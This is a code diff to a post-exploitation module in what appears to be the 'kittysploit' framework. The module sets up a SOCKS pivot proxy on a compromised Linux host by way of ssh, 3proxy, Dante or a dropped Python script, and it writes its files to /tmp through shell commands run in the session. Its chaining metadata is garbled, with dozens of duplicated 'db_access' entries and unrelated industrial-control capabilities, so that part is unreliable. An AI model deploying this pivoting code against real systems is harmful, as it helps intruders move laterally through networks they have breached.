@@ -1,8 +1,9 @@
 from kittysploit import *
 from lib.post.linux.system import System
+from lib.post.linux.session import LinuxSessionMixin
 import time
 
-class Module(Post, System):
+class Module(Post, System, LinuxSessionMixin):
 
     __info__ = {
         "name": "Linux SOCKS Proxy",
@@ -19,6 +20,56 @@ class Module(Post, System):
         'reversible': False,
         'approval_required': True,
         'produces': ['risk_signals'],
+        'cost': 1.5,
+        'noise': 0.5,
+        'value': 1.0,
+        'requires':         {'min_endpoints': 0,
+         'min_params': 0,
+         'tech_hints_any': [],
+         'tech_hints_all': [],
+         'specializations_any': [],
+         'risk_signals_any': [],
+         'auth_session': False,
+         'capabilities_any': [],
+         'capabilities_all': [],
+         'confidence_min': {},
+         'confidence_min_any': {},
+         'endpoint_pattern_any': [],
+         'param_any': [],
+         'api_surface_ready': False},
+        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 's7comm', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''}],
+         'consumes_capabilities': ['shell'],
+         'option_bindings': {},
+         'suggested_followups': []},
     },
     }
 
@@ -29,6 +80,9 @@ class Module(Post, System):
     def run(self):
         """Create SOCKS proxy through the session"""
         
+        if not self.linux_require_linux():
+            return False
+
         print_status("Setting up SOCKS proxy...")
         print_info(f"Type: {self.proxy_type}")
         print_info(f"Port: {self.proxy_port}")
@@ -53,17 +107,17 @@ class Module(Post, System):
     
     def _check_ssh_available(self):
         """Check if SSH is available"""
-        result = self.cmd_exec("which ssh 2>/dev/null")
+        result = self.linux_execute("which ssh 2>/dev/null")
         return result and result.strip()
     
     def _check_3proxy_available(self):
         """Check if 3proxy is available"""
-        result = self.cmd_exec("which 3proxy 2>/dev/null")
+        result = self.linux_execute("which 3proxy 2>/dev/null")
         return result and result.strip()
     
     def _check_dante_available(self):
         """Check if Dante (sockd) is available"""
-        result = self.cmd_exec("which sockd 2>/dev/null || which danted 2>/dev/null")
+        result = self.linux_execute("which sockd 2>/dev/null || which danted 2>/dev/null")
         return result and result.strip()
     
     def _ssh_socks_proxy(self):
@@ -106,7 +160,7 @@ socks -p{self.proxy_port}
             
             # Write config
             write_cmd = f"cat > {config_file} << 'EOF3PROXY'\n{config_content}\nEOF3PROXY"
-            self.cmd_exec(write_cmd)
+            self.linux_execute(write_cmd)
             
             # Start 3proxy
             if self.background:
@@ -114,11 +168,11 @@ socks -p{self.proxy_port}
             else:
                 start_cmd = f"3proxy {config_file}"
             
-            result = self.cmd_exec(start_cmd)
+            result = self.linux_execute(start_cmd)
             time.sleep(1)
             
             # Check if running
-            check = self.cmd_exec(f"ps aux | grep -v grep | grep '3proxy.*{config_file}'")
+            check = self.linux_execute(f"ps aux | grep -v grep | grep '3proxy.*{config_file}'")
             if check and check.strip():
                 print_success(f"3proxy SOCKS proxy started on port {self.proxy_port}!")
                 print_info(f"Configure your tools to use: {self.proxy_port} as SOCKS proxy")
@@ -165,17 +219,17 @@ socks pass {{
             config_file = f"/tmp/dante_{self.proxy_port}.conf"
             
             write_cmd = f"cat > {config_file} << 'EOFDANTE'\n{config_content}\nEOFDANTE"
-            self.cmd_exec(write_cmd)
+            self.linux_execute(write_cmd)
             
             if self.background:
                 start_cmd = f"sockd -f {config_file} &"
             else:
                 start_cmd = f"sockd -f {config_file}"
             
-            result = self.cmd_exec(start_cmd)
+            result = self.linux_execute(start_cmd)
             time.sleep(1)
             
-            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'sockd.*{config_file}'")
+            check = self.linux_execute(f"ps aux | grep -v grep | grep 'sockd.*{config_file}'")
             if check and check.strip():
                 print_success(f"Dante SOCKS proxy started on port {self.proxy_port}!")
                 
@@ -195,7 +249,7 @@ socks pass {{
         """Create SOCKS proxy using Python"""
         try:
             # Check Python availability
-            python_check = self.cmd_exec("which python3 2>/dev/null || which python 2>/dev/null")
+            python_check = self.linux_execute("which python3 2>/dev/null || which python 2>/dev/null")
             if not python_check or not python_check.strip():
                 print_error("Python not available for SOCKS proxy")
                 return False
@@ -204,7 +258,7 @@ socks pass {{
             print_status("Creating Python SOCKS proxy...")
             
             # Check if pysocks is available
-            pysocks_check = self.cmd_exec("python3 -c 'import socks' 2>&1")
+            pysocks_check = self.linux_execute("python3 -c 'import socks' 2>&1")
             has_pysocks = "No module" not in pysocks_check and "Error" not in pysocks_check
             
             if has_pysocks:
@@ -330,17 +384,17 @@ while True:
             
             script_path = f"/tmp/socks_{self.proxy_port}.py"
             write_cmd = f"cat > {script_path} << 'EOFSOCKS'\n{python_script}\nEOFSOCKS"
-            self.cmd_exec(write_cmd)
+            self.linux_execute(write_cmd)
             
             if self.background:
                 run_cmd = f"python3 {script_path} &"
             else:
                 run_cmd = f"python3 {script_path}"
             
-            result = self.cmd_exec(run_cmd)
+            result = self.linux_execute(run_cmd)
             time.sleep(1)
             
-            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'python.*{script_path}'")
+            check = self.linux_execute(f"ps aux | grep -v grep | grep 'python.*{script_path}'")
             if check and check.strip():
                 print_success(f"Python SOCKS proxy started on port {self.proxy_port}!")
                 print_info(f"Script: {script_path}")
